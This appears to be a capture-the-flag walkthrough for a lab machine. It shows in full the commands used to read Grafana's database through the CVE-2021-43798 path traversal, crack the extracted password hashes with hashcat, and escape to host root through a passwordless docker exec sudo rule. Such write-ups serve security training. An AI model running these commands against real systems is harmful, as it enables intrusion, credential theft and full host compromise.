Enumeration

I started with port enumeration.

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.6.57 22/tcp open ssh syn-ack ttl 63 3000/tcp open ppp syn-ack ttl 62

I found that a Grafana server runs on port 3000.

Tip: if you get "Secure Connection Failed", try another browser.

At the bottom right, we can see the version v8.0.0. This version has a known LFI vulnerability, CVE-2021-43798.

I found this Python script. It reads files if I know the absolute path.

python3 script.py -H http://10.129.6.57:3000 Read file > /var/lib/grafana/grafana.db

There I found information about some users.

If we copy and paste it, clear the dates and add some spaces, we get this:

borisboris@data.vlboris [REDACTED]LCBhdtJWjlmYl941ma8w adminadmin@localhost [REDACTED]YObSoLj55ShLLY6QQ4Y6

To read it better, I downloaded the file.

curl --path-as-is http://10.129.6.57:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db

Then I read it with sqlite3.

sqlite3 grafana.db sqlite> .tables ...<SNIP>... sqlite> select * from users;
admin|[REDACTED]|YObSoLj55S|hLLY6QQ4Y6| boris|[REDACTED]|LCBhdtJWjl|mYl941ma8w|

Now I can see that the format is name:hash:salt1:salt2. Here, salt2 is rands.

Because this is Grafana, we need to build the hash in a specific format so that hashcat can crack it.

Grafana's PBKDF2-HMAC-SHA256 implementation needs a very specific structure for hashcat to recognize it (mode 10900).

sha256:Iterations:Base64Salt:Base64Hash

For Grafana, the iterations value is usually 10000.

The hex hash for SHA-256 is exactly 64 characters long. Everything after those 64 characters is the salt.

I found this Python script. It is made for cracking Grafana passwords with hashcat.

I took the hash value and the salt1 value and put them in one .txt file. Then I ran the script.

cat test2.txt [REDACTED],LCBhdtJWjl ~/Downloads/Tools/Password Cracking/hashcat/hashcat-6.2.6/tools$ python3 grafana2hashcat.py /tmp/Data/test2.txt

I got this output:

sha256:10000:TENCaGR0SldqbA==:[REDACTED]

Now the hash is converted and ready to crack with hashcat.

hashcat -m 10900 test3.txt /usr/share/wordlists/rockyou.txt

Privilege Escalation

After I logged in as boris, I used sudo -l. It showed that I can run sudo /snap/bin/docker exec * without a password.

I needed the name of the container, so I used this command:

boris@data:~$ ps aux | grep docker

There I found the container ID.

-namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81

Next, I ran the container as the root user and started a bash shell.

sudo /snap/bin/docker exec -it -u root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash bash-5.1# whoami root

We have root privileges, but only inside a container.

Next, I used the mount command to see which device I needed to mount.

The final step is to mount /dev/sda1 on a new directory that I created.

mkdir /tmp/pwn mount /dev/sda1 /tmp/pwn/ cat /tmp/pwn/root/root.txt
